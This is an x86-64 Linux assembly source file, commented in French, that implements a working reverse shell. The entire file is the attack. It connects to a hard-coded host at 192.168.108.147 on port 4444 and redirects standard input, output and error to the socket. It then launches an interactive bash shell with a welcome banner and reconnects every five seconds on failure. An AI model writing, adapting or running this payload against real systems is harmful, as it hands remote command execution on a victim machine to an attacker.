section .data
TARGET_IP:
    dw 2                    ; AF_INET (2 bytes)
    dw 0x5c11               ; Port 4444 en network byte order
    dd 0x936CA8C0           ; IP 192.168.108.147 en network byte order
    times 8 db 0            ; padding pour sockaddr_in

welcome_msg:
    db "--------------------------------------------------", 0x0A
    db "|          BIENVENUE DANS LE REVERSE SHELL       |", 0x0A
    db "--------------------------------------------------", 0x0A
    db 0
welcome_len equ $ - welcome_msg

env_ps1: 
    db 'PS1=\[\033[1;32m\]\w\[\033[0m\]\$ ',0  ; PS1 avec couleur verte

bash_path:
    db '/bin/bash', 0       ; Utiliser bash au lieu de sh

bash_arg:
    db '-i', 0              ; Argument pour mode interactif

timespec:
    dd 5                    ; 5 secondes
    dd 0                    ; 0 nanosecondes

section .text
global _start

_start:
    jmp main

main:
    call create_socket
    test rax, rax
    js error_handler
    
    call connect
    test rax, rax
    js reconnect_if_fail
    
    call redir_io
    call shell
    call exit

create_socket:
    mov rax, 41             ; syscall socket
    mov rdi, 2              ; AF_INET
    mov rsi, 1              ; SOCK_STREAM
    mov rdx, 0              ; IP_PROTOCOL
    syscall
    mov r12, rax            ; Stocker descripteur
    ret

connect:
    mov rax, 42             ; syscall connect
    mov rdi, r12            ; descripteur socket
    lea rsi, [rel TARGET_IP]; structure sockaddr_in
    mov rdx, 16             ; taille structure
    syscall
    ret

redir_io:
    mov rsi, 0              ; stdin
redir_loop:
    mov rax, 33             ; syscall dup2
    mov rdi, r12            ; descripteur socket
    mov rdx, rsi
    syscall
    inc rsi                 ; stdout, stderr
    cmp rsi, 3
    jl redir_loop
    ret

shell:
    ; Affichage message de bienvenue
    mov rax, 1              ; sys_write
    mov rdi, 1              ; stdout
    lea rsi, [rel welcome_msg]
    mov rdx, welcome_len
    syscall

    ; Construction environnement
    lea rax, [rel env_ps1]  
    push 0                  ; NULL terminator envp
    push rax                ; Pointeur vers PS1
    mov r8, rsp             ; Sauvegarder envp

    ; Construction argv pour bash -i
    push 0                  ; argv[2] = NULL
    lea rax, [rel bash_arg] ; "-i"
    push rax                ; argv[1] = "-i"
    lea rax, [rel bash_path]; "/bin/bash" 
    push rax                ; argv[0] = "/bin/bash"
    
    mov rdi, rax            ; path = "/bin/bash"
    mov rsi, rsp            ; argv = ["/bin/bash", "-i", NULL]
    mov rdx, r8             ; envp = [PS1, NULL]
    mov rax, 59             ; execve
    syscall
    ret

error_handler:
    mov rax, 3              ; syscall close
    mov rdi, r12
    syscall

reconnect_if_fail:
    mov rax, 35             ; syscall nanosleep
    lea rdi, [rel timespec] ; attendre 5 secondes
    xor rsi, rsi
    syscall
    jmp main                ; recommencer

exit:
    mov rax, 60             ; syscall exit
    mov rdi, 0
    syscall
